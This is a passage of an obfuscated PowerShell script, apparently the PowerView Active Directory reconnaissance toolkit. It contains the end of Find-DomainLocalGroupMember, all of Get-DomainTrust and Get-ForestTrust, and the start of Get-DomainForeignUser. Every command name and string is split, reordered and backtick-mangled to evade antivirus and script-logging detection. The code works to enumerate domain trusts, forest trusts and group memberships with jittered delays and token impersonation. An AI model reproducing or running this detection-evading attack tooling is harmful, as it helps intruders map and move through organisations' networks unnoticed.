            &("{0}{3}{2}{1}" -f 'Wr','e','rbos','ite-Ve') ('[F'+'ind'+'-Dom'+'a'+'inLo'+'cal'+'Gr'+'oupMembe'+'r] '+'Delay'+': '+"$Delay, "+'J'+'itter'+': '+"$Jitter")
            ${c`o`UNTEr} = 0
            ${R`AnDno} = &("{0}{3}{1}{2}"-f 'Ne','c','t','w-Obje') ("{3}{1}{0}{2}" -f'm.Ra','te','ndom','Sys')

            ForEach (${taRGET`c`Omp`UT`Er} in ${TaRG`EtcO`Mpu`TE`Rs}) {
                ${C`OuN`TER} = ${cO`U`NtEr} + 1

                
                &("{1}{0}{2}"-f'ar','St','t-Sleep') -Seconds ${RanD`No}.("{0}{1}"-f 'Ne','xt').Invoke((1-${jIt`Ter})*${d`eLaY}, (1+${jIT`TeR})*${DE`LAY})

                &("{2}{1}{0}{3}" -f '-V','e','Writ','erbose') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &("{1}{4}{0}{3}{2}"-f'ke-','Inv','nd','Comma','o') -ScriptBlock ${hoS`TenumbLo`CK} -ArgumentList ${TargE`TC`oMpu`Ter}, ${G`Ro`UPnAme}, ${m`e`ThoD}, ${l`OGoNTOk`En}
            }
        }
        else {
            &("{3}{4}{2}{0}{1}"-f 'os','e','Verb','Wri','te-') ('[Fin'+'d-'+'DomainLoca'+'lG'+'roupMe'+'mber] '+'Usi'+'ng '+'t'+'hreadin'+'g '+'wit'+'h '+'threads:'+' '+"$Threads")

            
            ${sC`Rip`TPArams} = @{
                ("{1}{0}" -f'e','GroupNam') = ${gRoup`N`Ame}
                ("{1}{0}"-f'd','Metho') = ${M`EthOd}
                ("{0}{1}{3}{2}" -f 'T','oke','le','nHand') = ${l`OGONto`KEN}
            }

            
            &("{3}{4}{1}{5}{0}{2}" -f 'n','e','ction','New-','Thr','adedFu') -ComputerName ${TaR`GeTcOM`pU`T`eRS} -ScriptBlock ${h`O`S`T`eNumbLOCk} -ScriptParameters ${Sc`Ri`PT`pARaMs} -Threads ${tHr`E`ADS}
        }
    }

    END {
        if (${loGO`NToK`En}) {
            &("{4}{0}{5}{3}{1}{2}" -f'oke-','tToSe','lf','er','Inv','Rev') -TokenHandle ${L`ogOn`To`KEN}
        }
    }
}








function GeT-`domA`inTR`UST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}"-f'uldProc','P','ess','SSho'}, '')]
    [OutputType({"{3}{1}{0}{2}{4}{5}" -f 'DomainT','w.','ru','PowerVie','s','t.NET'})]
    [OutputType({"{3}{5}{2}{1}{4}{0}"-f 't.LDAP','Tru','omain','PowerView','s','.D'})]
    [OutputType({"{6}{5}{1}{3}{4}{2}{0}{7}"-f 'Tru','erV','n','iew','.Domai','ow','P','st.API'})]
    [CmdletBinding(DEfAultPARaMETErsETNAmE = {"{0}{1}"-f'LDA','P'})]
    Param(
        [Parameter(POsITioN = 0, valUEfROmPiPeLIne = ${tR`Ue}, VAluEfRomPiPElinEByPROPertynAME = ${TR`UE})]
        [Alias({"{1}{0}" -f'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`AiN},

        [Parameter(PAramEtErsetNaMe = 'API')]
        [Switch]
        ${a`PI},

        [Parameter(PArAMEtERSEtName = 'NET')]
        [Switch]
        ${n`Et},

        [Parameter(ParamETERSETNaME = "lD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'lter','Fi'})]
        [String]
        ${ldApFi`L`T`ER},

        [Parameter(paRamETerSETnaMe = "ld`Ap")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${P`R`OpERTieS},

        [Parameter(paRAMeTeRSEtnAMe = "l`Dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'Path','ADS'})]
        [String]
        ${SeaR`C`hBA`sE},

        [Parameter(PARamETerSEtNAME = "LD`AP")]
        [Parameter(PaRAMetErseTNaMe = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{4}{2}{3}{0}" -f'ontroller','Doma','n','C','i'})]
        [String]
        ${S`eRVEr},

        [Parameter(parAmETersetnaME = "Ld`Ap")]
        [ValidateSet({"{0}{1}" -f'Ba','se'}, {"{0}{1}"-f'OneLeve','l'}, {"{2}{0}{1}"-f 'bt','ree','Su'})]
        [String]
        ${se`ARcH`S`COPE} = ("{2}{0}{1}" -f 'tre','e','Sub'),

        [Parameter(pAramETeRSEtnaME = "L`dap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${ReS`U`lTpa`G`EsizE} = 200,

        [Parameter(PaRAMeTERsEtnaMe = "Ld`Ap")]
        [ValidateRange(1, 10000)]
        [Int]
        ${se`RV`ErTimelIMIT},

        [Parameter(PARAMeTersETnaMe = "L`daP")]
        [Switch]
        ${toM`BS`TOne},

        [Alias({"{0}{1}"-f'Retu','rnOne'})]
        [Switch]
        ${FinD`OnE},

        [Parameter(pAraMeTersEtNaME = "lD`Ap")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${credE`NTi`Al} =   ( lS  ('vAR'+'I'+'AbLE:qfN') )."V`AlUe"::"EM`PTY"
    )

    BEGIN {
        ${TRU`statT`R`ibuTeS} = @{
            [uint32]("{0}{2}{1}" -f'0x000','1','0000') = ("{1}{0}{2}" -f 'SITIV','NON_TRAN','E')
            [uint32]("{0}{3}{2}{1}" -f'0x00','002','0','00') = ("{1}{3}{2}{0}" -f'Y','UPL','EL_ONL','EV')
            [uint32]("{1}{0}{2}" -f'00','0x00','0004') = ("{1}{0}{3}{2}" -f'I','F','ER_SIDS','LT')
            [uint32]("{1}{2}{0}"-f'0000008','0','x0') = ("{1}{3}{2}{0}" -f 'E','F','ANSITIV','OREST_TR')
            [uint32]("{0}{2}{1}" -f '0x','010','00000') = ("{1}{4}{3}{2}{0}"-f'ZATION','CROSS_OR','I','AN','G')
            [uint32]("{2}{0}{1}"-f 'x000000','20','0') = ("{0}{1}{3}{2}"-f'WITH','IN_FOR','ST','E')
            [uint32]("{2}{0}{1}"-f'000','0040','0x0') = ("{3}{0}{1}{2}"-f'N','A','L','TREAT_AS_EXTER')
            [uint32]("{0}{1}{2}"-f '0x','00','000080') = ("{5}{3}{6}{4}{2}{1}{0}"-f'ION','T','NCRYP','RUST_USES','RC4_E','T','_')
            [uint32]("{0}{2}{1}" -f'0x0000','00','01') = ("{1}{0}{3}{4}{2}{5}" -f'ST_USES_','TRU','KE','AES','_','YS')
            [uint32]("{2}{1}{3}{0}"-f'00200','0','0x0','0') = ("{3}{7}{5}{9}{1}{2}{4}{6}{8}{10}{0}" -f 'N','ATIO','N_','CROSS','NO_TGT_DE','ORGA','L','_','EGA','NIZ','TIO')
            [uint32]("{2}{0}{1}"-f'x000004','00','0') = ("{0}{1}{2}"-f 'PIM_','TRU','ST')
        }

        ${L`d`A`pseAR`c`heR`ArgUmENtS} = @{}
        if (${pSBOuND`pa`RA`M`ET`ErS}[("{0}{1}{2}" -f'Dom','ai','n')]) { ${lDAPsear`C`HEr`ARGUmen`TS}[("{1}{0}" -f 'n','Domai')] = ${D`OmAiN} }
        if (${PsBO`UNdpARa`MetE`Rs}[("{1}{2}{0}"-f 'Filter','LDA','P')]) { ${ldAP`SE`A`Rc`hEr`ArGUmE`NtS}[("{0}{1}{2}"-f'LD','A','PFilter')] = ${lDAP`F`ilt`er} }
        if (${PSB`Ou`NdpARAm`eterS}[("{0}{1}{2}"-f 'Pr','oper','ties')]) { ${LDAps`EarCHer`AR`guM`e`Nts}[("{2}{1}{3}{0}"-f 's','operti','Pr','e')] = ${PR`oPErt`i`eS} }
        if (${PsBoU`Ndpa`Ra`meTe`Rs}[("{0}{3}{1}{2}" -f 'Sea','h','Base','rc')]) { ${lD`A`PseA`RcHErA`R`gUmENts}[("{2}{1}{0}"-f 'Base','earch','S')] = ${s`ear`CHBa`Se} }
        if (${ps`B`O`UnDPArA`MET`eRS}[("{0}{1}" -f 'Se','rver')]) { ${l`dAPSEArCh`e`RaRgU`MEnTS}[("{0}{1}"-f'Ser','ver')] = ${SER`VER} }
        if (${P`SBouND`Pa`RamETE`RS}[("{2}{1}{0}" -f'e','p','SearchSco')]) { ${LDap`s`EaRCh`erA`RGu`Men`TS}[("{1}{2}{0}" -f'ope','Se','archSc')] = ${SE`ArChs`cOPE} }
        if (${PsbOunDp`A`R`AM`eTers}[("{1}{3}{0}{2}"-f 'Siz','Resul','e','tPage')]) { ${ldaPSE`ArC`HeR`ARGUME`NtS}[("{0}{1}{2}{3}" -f 'Resul','tPag','e','Size')] = ${r`eSUlt`P`AgesizE} }
        if (${p`sBOundP`ArA`M`Et`eRs}[("{1}{2}{3}{0}{4}"-f 'eLimi','Se','rver','Tim','t')]) { ${ldapS`EA`RC`herarg`UmeNTS}[("{1}{3}{0}{2}" -f 'i','S','mit','erverTimeL')] = ${S`eR`VeRtIMe`li`MIt} }
        if (${PSB`OUNDP`Ara`METErs}[("{1}{2}{0}" -f'ne','T','ombsto')]) { ${l`d`APse`A`R`CHerArguMENTs}[("{1}{2}{0}"-f'e','Tombst','on')] = ${Tom`BS`ToNE} }
        if (${psb`o`UnDpaRA`ME`TERS}[("{2}{3}{1}{0}"-f 'l','ia','Cr','edent')]) { ${LdaPs`EAR`CHer`ARG`U`m`EntS}[("{1}{2}{0}"-f'l','Cred','entia')] = ${C`Reden`TiaL} }
    }

    PROCESS {
        if (${pS`CMD`lET}.pARaMeTeRseTNAme -ne 'API') {
            ${nEts`EAR`ch`ErA`R`gUMEnts} = @{}
            if (${DoM`Ain} -and ${DO`Ma`iN}.("{0}{1}" -f 'T','rim').Invoke() -ne '') {
                ${soUrc`eD`O`maIn} = ${do`main}
            }
            else {
                if (${P`sbOUnd`p`A`R`AMEtERS}[("{0}{1}{2}" -f 'Cre','dentia','l')]) {
                    ${SoU`RCe`dOmA`iN} = (&("{2}{0}{1}" -f '-Dom','ain','Get') -Credential ${cR`eDE`NT`iAL})."NA`me"
                }
                else {
                    ${So`URcEDOm`AIn} = (&("{0}{3}{1}{2}"-f'Get-Do','ai','n','m'))."NA`mE"
                }
            }
        }
        elseif (${Ps`C`mDLET}.paRAmeTErSEtName -ne 'NET') {
            if (${D`Om`AIN} -and ${Do`m`AIn}.("{0}{1}" -f'Tr','im').Invoke() -ne '') {
                ${SO`Ur`ce`DoMA`IN} = ${DO`MAIN}
            }
            else {
                ${SOURC`ED`oMAIN} = ${EnV:`UsEr`DNs`do`m`AIN}
            }
        }

        if (${pScm`d`leT}.PARAMeteRsETNAmE -eq ("{0}{1}"-f'L','DAP')) {
            
            ${tr`UstS`eA`Rch`Er} = &("{1}{0}{2}{3}{4}" -f 't','Ge','-DomainS','e','archer') @LdapSearcherArguments
            ${so`URCe`Sid} = &("{3}{1}{2}{0}"-f 'ainSID','-','Dom','Get') @NetSearcherArguments

            if (${TrU`sTseAR`Cher}) {

                ${Tr`U`St`seA`RcHeR}."fi`LteR" = (("{5}{3}{1}{0}{6}{2}{4}"-f'tClass=tru','ec','tedDoma','bj','in)','(o','s'))

                if (${psb`oUnDpA`RaM`e`TeRS}[("{1}{0}" -f'indOne','F')]) { ${res`Ul`Ts} = ${TR`UStS`Ea`R`cHeR}.("{0}{1}"-f'Fi','ndOne').Invoke() }
                else { ${R`E`sUlTS} = ${T`RuSTsE`A`RchER}.("{1}{0}{2}"-f 'ind','F','All').Invoke() }
                ${ReS`Ul`Ts} | &("{0}{3}{2}{1}" -f 'Whe','ject','Ob','re-') {${_}} | &("{1}{3}{2}{0}"-f'ct','Fo','ach-Obje','rE') {
                    ${Pr`OPs} = ${_}."PR`O`PERTies"
                    ${Do`m`Ai`NTrUsT} = &("{2}{0}{1}{3}"-f 'w-Obje','c','Ne','t') ("{2}{1}{0}"-f 'ject','Ob','PS')

                    ${Tru`sta`TT`RIB} = @()
                    ${TR`UStAt`TR`iB} += ${tr`Us`Ta`TTRI`ButES}."K`Eys" | &("{0}{1}{2}{3}" -f'Whe','r','e-Obj','ect') { ${pR`OPs}."truS`TA`TTRIbut`eS"[0] -band ${_} } | &("{3}{0}{2}{1}"-f 'Each-Obj','ct','e','For') { ${tR`UST`ATtriB`U`TEs}[${_}] }

                    ${d`i`RECTIon} = Switch (${P`Ro`PS}."TrU`StDI`Re`Ct`iOn") {
                        0 { ("{1}{0}{2}"-f 'ble','Disa','d') }
                        1 { ("{0}{1}"-f'I','nbound') }
                        2 { ("{1}{0}{2}"-f 'o','Outb','und') }
                        3 { ("{3}{1}{0}{2}"-f'rec','i','tional','Bid') }
                    }

                    ${TRUS`Tt`ypE} = Switch (${p`ROps}."tr`USTty`PE") {
                        1 { ("{1}{2}{0}{5}{3}{4}{6}" -f 'N_ACTIV','WI','NDOWS_NO','_D','I','E','RECTORY') }
                        2 { ("{5}{2}{0}{1}{3}{4}" -f'C','TI','S_A','VE_D','IRECTORY','WINDOW') }
                        3 { 'MIT' }
                    }

                    ${Di`s`TI`NGUISH`ednAme} = ${pR`oPS}."distin`guiS`HED`N`AmE"[0]
                    ${SoUrC`E`NAM`E`inDEX} = ${DIsTin`gu`i`s`HednAMe}.("{1}{0}" -f'ndexOf','I').Invoke('DC=')
                    if (${s`oURC`en`AMEiNdEX}) {
                        ${SO`UrceD`OM`AiN} = $(${DIS`TiNGuIsH`EDn`Ame}.("{2}{1}{0}"-f'ing','tr','SubS').Invoke(${sOURcE`Na`M`eInDEx})) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        ${SoU`R`CEdOMain} = ""
                    }

                    ${TarGE`T`N`AmEIndex} = ${D`i`sti`NguisHeDNa`mE}.("{2}{0}{1}" -f'd','exOf','In').Invoke(("{2}{3}{0}{1}" -f 'S','ystem',',C','N='))
                    if (${SO`U`RceNAM`EindeX}) {
                        ${tAR`GeTdoma`In} = ${disTin`GUIs`HeD`NA`Me}.("{2}{1}{0}" -f 'String','ub','S').Invoke(3, ${targE`T`N`A`mEindEx}-3)
                    }
                    else {
                        ${Targ`etdoMa`in} = ""
                    }

                    ${objE`C`TGUiD} = &("{0}{1}{2}"-f 'New','-Obje','ct') ("{1}{0}" -f 'id','Gu') @(,${P`RopS}."oBJEcT`g`UId"[0])
                    ${tARgE`TS`id} = (&("{0}{2}{1}"-f'New-','t','Objec') ("{7}{9}{3}{5}{0}{8}{2}{1}{4}{6}" -f 'Se','dentif','tyI','ipa','ie','l.','r','System.Security','curi','.Princ')(${P`ROps}."sEcur`ItY`id`ENTiFIER"[0],0))."V`ALUE"

                    ${d`Om`AInTrust} | &("{1}{2}{0}" -f 'Member','Ad','d-') ("{1}{2}{0}"-f'roperty','No','tep') ("{0}{1}{2}" -f'Sourc','eNam','e') ${So`UR`cEdOm`Ain}
                    ${D`OM`A`INTruSt} | &("{0}{2}{1}" -f'Ad','er','d-Memb') ("{0}{2}{1}" -f'Note','roperty','p') ("{1}{2}{0}{3}" -f'rget','T','a','Name') ${p`RoPS}."n`Ame"[0]
                    
                    ${DOmAIn`T`RUSt} | &("{1}{0}{2}" -f'Mem','Add-','ber') ("{2}{0}{3}{1}" -f 't','operty','No','epr') ("{1}{0}{2}" -f'rus','T','tType') ${t`RUSTT`Y`Pe}
                    ${D`omAi`NTr`UsT} | &("{1}{3}{0}{2}" -f '-Memb','A','er','dd') ("{3}{0}{1}{2}" -f'ot','epro','perty','N') ("{2}{1}{0}{4}{3}"-f'A','ust','Tr','ributes','tt') $(${t`R`UsTAttrIB} -join ',')
                    ${doMa`i`NT`RuSt} | &("{1}{0}{2}" -f'-Memb','Add','er') ("{3}{0}{1}{2}" -f'rop','er','ty','Notep') ("{1}{0}{3}{2}"-f'c','TrustDire','n','tio') "$Direction"
                    ${d`omA`In`TRust} | &("{2}{0}{1}"-f'dd-Mem','ber','A') ("{3}{1}{2}{0}"-f'rty','ote','prope','N') ("{1}{2}{0}{3}" -f'e','WhenC','reat','d') ${PrO`ps}."WH`EncreA`TeD"[0]
                    ${DO`M`Aintr`Ust} | &("{0}{2}{1}"-f 'Add-','ber','Mem') ("{2}{3}{1}{0}"-f'ty','er','Notep','rop') ("{2}{0}{1}" -f 'hang','ed','WhenC') ${pr`o`PS}."w`hE`NCHaNGEd"[0]
                    ${d`Om`AIn`TrusT}."P`S`ObJeCT"."tYPEN`AMeS".("{0}{1}"-f 'In','sert').Invoke(0, ("{1}{3}{6}{2}{0}{4}{5}{7}"-f'st','Po','ainTru','werView','.L','DA','.Dom','P'))
                    ${D`oMaIN`TRuST}
                }
                if (${ReS`Ul`Ts}) {
                    try { ${reS`UL`TS}.("{1}{0}" -f 'ose','disp').Invoke() }
                    catch {
                        &("{0}{2}{1}{3}" -f 'Wri','os','te-Verb','e') ('[Get'+'-Doma'+'in'+'Trust]'+' '+'E'+'rr'+'or '+'di'+'sp'+'osing '+'of'+' '+'t'+'he '+'Re'+'sults'+' '+'obj'+'e'+'ct: '+"$_")
                    }
                }
                ${tr`Us`TseARc`hEr}.("{0}{1}{2}" -f'disp','os','e').Invoke()
            }
        }
        elseif (${P`SCM`dlET}.pARAmEtErSetNaME -eq 'API') {
            
            if (${PsB`OuNDPa`R`AmETERS}[("{2}{1}{0}"-f 'r','ve','Ser')]) {
                ${TARge`T`DC} = ${sEr`V`eR}
            }
            elseif (${dom`AIn} -and ${Dom`Ain}.("{1}{0}" -f'm','Tri').Invoke() -ne '') {
                ${tARG`E`TDC} = ${Do`MAin}
            }
            else {
                
                ${taRg`E`Tdc} = ${n`ULL}
            }

            
            ${PtR`i`NFo} =   (  GET-VaRIABle ('KeGs'+'b'))."v`AlUe"::"Z`ero"

            
            ${fL`AGs} = 63
            ${D`oMAIN`cOUnT} = 0

            
            ${REsU`lt} = ${ne`Ta`pI`32}::"DsEN`U`MER`A`TeDo`Mai`NtR`USts"(${TARgE`TDc}, ${Fl`A`Gs}, [ref]${pTr`i`Nfo}, [ref]${Do`m`A`iNcounT})

            
            ${O`Ff`SET} = ${pT`Rin`Fo}.("{1}{2}{0}" -f't64','T','oIn').Invoke()

            
            if ((${resu`LT} -eq 0) -and (${OfF`seT} -gt 0)) {

                
                ${I`N`CR`emeNT} = ${dS_`domAIN`_`TRu`STs}::("{0}{1}" -f 'GetS','ize').Invoke()

                
                for (${i} = 0; (${I} -lt ${Do`m`AINCoUNT}); ${i}++) {
                    
                    ${NEwi`NtP`Tr} = &("{2}{0}{1}"-f'w-Objec','t','Ne') ("{3}{0}{1}{2}" -f's','tem.I','ntptr','Sy') -ArgumentList ${o`FFs`et}
                    ${iN`Fo} = ${NewI`N`TPtR} -as ${D`S_`DO`maIN`_tRuStS}

                    ${O`FfseT} = ${N`e`WIN`TPtr}.("{1}{2}{0}"-f'64','T','oInt').Invoke()
                    ${OF`Fs`eT} += ${INc`Re`mE`NT}

                    ${SiD`s`Tr`iNg} = ''
                    ${reS`Ult} = ${a`dvaPi`32}::"coNVErts`i`dTost`RInGs`id"(${IN`FO}."dOma`IN`S`ID", [ref]${SId`ST`RINg});${LA`ste`RRoR} =   (  gI ("{1}{3}{0}{2}" -f 'l','vA','e:3rx8iv','rIAb')  )."V`ALUe"::("{3}{0}{1}{2}{4}" -f'etLas','tWin32','Erro','G','r').Invoke()

                    if (${r`esulT} -eq 0) {
                        &("{1}{0}{3}{2}" -f'V','Write-','rbose','e') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
                    }
                    else {
                        ${dO`mai`NTr`UST} = &("{2}{1}{0}" -f 'bject','ew-O','N') ("{1}{0}" -f 'ct','PSObje')
                        ${do`MAIN`TR`UsT} | &("{1}{0}{2}"-f'mb','Add-Me','er') ("{1}{3}{0}{2}"-f'o','Not','perty','epr') ("{1}{0}{2}"-f'c','Sour','eName') ${So`Ur`c`EdOmain}
                        ${DO`MAintr`USt} | &("{1}{2}{0}" -f'er','Add-M','emb') ("{1}{0}{2}"-f'ote','N','property') ("{0}{1}{2}{3}"-f'T','ar','get','Name') ${i`NFO}."dnSDom`AIN`NA`mE"
                        ${dOm`A`INTRu`sT} | &("{0}{3}{2}{1}" -f'Add-M','r','be','em') ("{3}{0}{1}{2}"-f 'pr','o','perty','Note') ("{2}{4}{0}{1}{3}" -f'Ne','tbio','Tar','sName','get') ${i`NfO}."NeTb`I`o`SDOm`AI`NnAme"
                        ${D`Om`A`iNtrUST} | &("{2}{1}{0}"-f 'mber','Me','Add-') ("{1}{2}{0}{3}"-f 'ro','Not','ep','perty') ("{1}{0}"-f 'lags','F') ${i`Nfo}."f`LAgS"
                        ${dOM`AIn`Tr`USt} | &("{3}{1}{2}{0}"-f'ber','d','-Mem','Ad') ("{2}{1}{0}" -f'y','pert','Notepro') ("{0}{2}{1}{3}" -f'P','nd','arentI','ex') ${in`Fo}."Par`entINd`ex"
                        ${domai`Nt`RU`St} | &("{1}{2}{0}" -f 'ber','Ad','d-Mem') ("{2}{0}{3}{1}" -f 'rop','y','Notep','ert') ("{1}{0}{2}" -f'ustTy','Tr','pe') ${i`NFo}."Tru`STT`YPe"
                        ${domaIN`T`R`UST} | &("{3}{0}{1}{2}" -f '-Me','mbe','r','Add') ("{0}{2}{1}" -f 'Note','y','propert') ("{2}{3}{1}{0}" -f 'es','ibut','Trus','tAttr') ${iN`Fo}."trUstAttr`ibut`Es"
                        ${d`omaI`NtR`Ust} | &("{2}{3}{1}{0}" -f'r','mbe','Add-M','e') ("{3}{2}{0}{1}"-f 'rt','y','pe','Notepro') ("{0}{2}{1}"-f 'Ta','getSid','r') ${S`ID`S`TRiNG}
                        ${doM`AINT`RU`sT} | &("{2}{0}{1}"-f'mbe','r','Add-Me') ("{0}{2}{3}{1}"-f 'N','y','ot','epropert') ("{1}{2}{0}" -f 'Guid','Ta','rget') ${i`NfO}."DO`MAiNG`UId"
                        ${DoMAIn`T`RUsT}."p`So`BJeCT"."ty`PEn`AmEs".("{0}{1}" -f 'I','nsert').Invoke(0, ("{0}{1}{4}{2}{3}{6}{5}" -f'Power','V','w.','Doma','ie','rust.API','inT'))
                        ${DOmAIN`T`Ru`st}
                    }
                }
                
                ${N`UlL} = ${nETAPI`32}::("{1}{0}{3}{2}" -f'piBuffe','NetA','Free','r').Invoke(${Pt`R`InFO})
            }
            else {
                &("{2}{0}{1}"-f 'ite-Verb','ose','Wr') "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message) "
            }
        }
        else {
            
            ${f`OU`N`ddomaIn} = &("{0}{1}{2}"-f'Get-','D','omain') @NetSearcherArguments
            if (${fo`Un`DDOM`AIn}) {
                ${FouNd`DomA`in}.("{5}{4}{1}{3}{0}{6}{2}"-f 'TrustRelations','l','ps','l','tA','Ge','hi').Invoke() | &("{1}{0}{3}{2}"-f'ch-','ForEa','bject','O') {
                    ${_}."Pso`BJEcT"."tY`peNA`MES".("{0}{2}{1}" -f 'I','t','nser').Invoke(0, ("{5}{4}{1}{2}{0}{3}"-f 'st.N','ai','nTru','ET','m','PowerView.Do'))
                    ${_}
                }
            }
        }
    }
}


function geT-FoRES`T`TR`UST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}"-f'ouldPro','cess','Sh','PS'}, '')]
    [OutputType({"{2}{5}{4}{0}{6}{1}{3}" -f't.','E','PowerVie','T','restTrus','w.Fo','N'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOSItIOn = 0, VaLUeFrOmPIpeliNE = ${Tr`UE}, VaLuEFRompIPeLInEbyprOPErtYNAmE = ${TR`UE})]
        [Alias({"{0}{1}" -f'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${f`oR`Est},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEDE`NT`iaL} =  (get-ChiLDITem ('vaR'+'IAB'+'le'+':qFN') )."VA`Lue"::"E`mPTY"
    )

    PROCESS {
        ${neT`Fo`Res`TArg`U`MentS} = @{}
        if (${PSb`ouNDP`ARAm`e`TE`Rs}[("{1}{0}" -f 'orest','F')]) { ${nETfo`RE`STA`RgUME`NTS}[("{1}{0}" -f'rest','Fo')] = ${FORE`St} }
        if (${P`SB`oUNDp`AR`AMETe`Rs}[("{0}{2}{1}"-f'Cr','al','edenti')]) { ${Ne`TF`oREStAR`GuMe`NtS}[("{0}{2}{1}"-f'Cre','ial','dent')] = ${c`REdent`I`Al} }

        ${FoUN`D`F`OreST} = &("{0}{2}{1}" -f'Get-','orest','F') @NetForestArguments

        if (${FoUndf`ore`St}) {
            ${FouND`F`O`REst}.("{1}{0}{7}{5}{2}{6}{4}{3}"-f'et','G','ati','ps','shi','stRel','on','AllTru').Invoke() | &("{1}{2}{3}{0}"-f'h-Object','Fo','rE','ac') {
                ${_}."PSO`BjE`ct"."T`ypenaM`Es".("{0}{1}"-f 'In','sert').Invoke(0, ("{0}{2}{5}{1}{3}{6}{4}" -f 'Pow','w.Fo','er','restT','NET','Vie','rust.'))
                ${_}
            }
        }
    }
}


function GET`-D`oMa`i`NfoREign`UsEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}"-f 'ho','PSS','uldProce','ss'}, '')]
    [OutputType({"{0}{3}{1}{2}"-f'Pow','Foreig','nUser','erView.'})]
    [CmdletBinding()]
    Param(
        [Parameter(PoSITION = 0, vALuEFroMPIPeliNE = ${T`RUE}, vALUefrOmPiPeLINEBYpRoPerTyNAME = ${tr`UE})]
        [Alias({"{0}{1}"-f 'Na','me'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DoMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f 'r','Fil','te'})]
        [String]
        ${lda`pfiL`TeR},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pro`per`Ti`ES},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f 'AD','SPa','th'})]
        [String]
        ${SE`A`RChbaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{1}{2}" -f 'Do','ntro','ller','mainCo'})]
        [String]
        ${SE`Rv`ER},

        [ValidateSet({"{1}{0}"-f 'e','Bas'}, {"{0}{2}{1}" -f'O','Level','ne'}, {"{1}{0}{2}"-f 'btr','Su','ee'})]
        [String]
        ${seaRcHs`C`O`Pe} = ("{1}{0}" -f 'ee','Subtr'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`eSU`ltPAG`Esize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeRvErt`i`Me`l`i`Mit},

        [ValidateSet({"{0}{1}" -f 'D','acl'}, {"{0}{1}" -f 'Gro','up'}, {"{0}{1}" -f'Non','e'}, {"{1}{0}" -f'ner','Ow'}, {"{1}{0}"-f 'l','Sac'})]
        [String]
        ${se`C`URiTymaSkS},

        [Switch]
        ${tOM`BS`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`edEN`Ti`Al} =   (gEt-vARiABLe  ("{0}{1}"-f 'qf','N') )."V`ALue"::"e`mPTy"
    )

    BEGIN {
        ${SE`ArCHerAR`gU`ME`Nts} = @{}
        ${S`E`Arc`her`ARGUmEN`TS}[("{2}{0}{1}{3}"-f 'DAPFi','lte','L','r')] = (("{1}{3}{2}{0}" -f '*)','(me','berof=','m'))
        if (${p`SbOu`NDpaR`AMe`TERS}[("{0}{2}{1}" -f 'D','n','omai')]) { ${sEa`RChEraRGU`m`en`TS}[("{0}{1}{2}"-f'Dom','a','in')] = ${DOM`A`in} }
        if (${PSBouN`dPAr`AmEt`ERs}[("{1}{0}{2}" -f 'erti','Prop','es')]) { ${Se`ARCheRaR`G`UME`N`Ts}[("{1}{0}{2}"-f'op','Pr','erties')] = ${p`RoP`ErTIES} }
        if (${PS`B`OUNDP`AR`AmeT`erS}[("{2}{1}{3}{0}" -f 'e','earc','S','hBas')]) { ${Sea`R`CheRa`RGUm`EntS}[("{3}{0}{1}{2}" -f'chBa','s','e','Sear')] = ${S`eaR`cHB`AsE} }
        if (${Ps`BoUnDPA`R`AMe`Te`Rs}[("{0}{1}" -f 'S','erver')]) { ${sE`A`RCHeR`ARGumENtS}[("{2}{0}{1}"-f 'er','ver','S')] = ${SE`Rv`ER} }
        if (${Psb`oUNdPaR`A`m`Ete`RS}[("{2}{0}{1}"-f'rchS','cope','Sea')]) { ${sEAR`chE`RaRg`U`meNTS}[("{1}{2}{3}{0}"-f'cope','Sea','r','chS')] = ${sear`C`HsC`oPE} }
        if (${pSBounD`Pa`RAMEt`ers}[("{3}{0}{1}{2}"-f 'Pa','geSi','ze','Result')]) { ${sE`ArC`HERaRG`UMen`Ts}[("{0}{1}{2}{3}" -f 'ResultPa','ge','Si','ze')] = ${rEsU`lt`paGEsI`ze} }
        if (${PSbOuNd`ParAm`E`TERS}[("{1}{2}{3}{0}"-f 'it','ServerTime','Li','m')]) { ${SE`A`RCHe`RArgumEn`Ts}[("{1}{3}{0}{2}"-f 'rTimeLim','Se','it','rve')] = ${SE`RVE`RtIMEL`i`MiT} }
        if (${P`S`B`OuNDp`AR`AmEteRs}[("{0}{1}{2}" -f'Secu','rity','Masks')]) { ${se`ARCHeRAr`GUmE`NTs}[("{1}{0}{2}{3}" -f'i','Secur','tyMa','sks')] = ${sE`c`URIT`yMASks} }
        if (${Ps`BOuND`paRaM`etE`Rs}[("{1}{2}{0}"-f 'mbstone','T','o')]) { ${s`eA`RcHERA`RG`UMeNTS}[("{2}{0}{1}"-f'ston','e','Tomb')] = ${TOM`B`SToNE} }
        if (${Psb`OUN`D`p`A`RaMEteRs}[("{3}{1}{2}{0}"-f'l','en','tia','Cred')]) { ${Sea`RCH`E`RarGUMents}[("{1}{2}{0}"-f 'l','Cred','entia')] = ${c`R`EdEnt`IAl} }
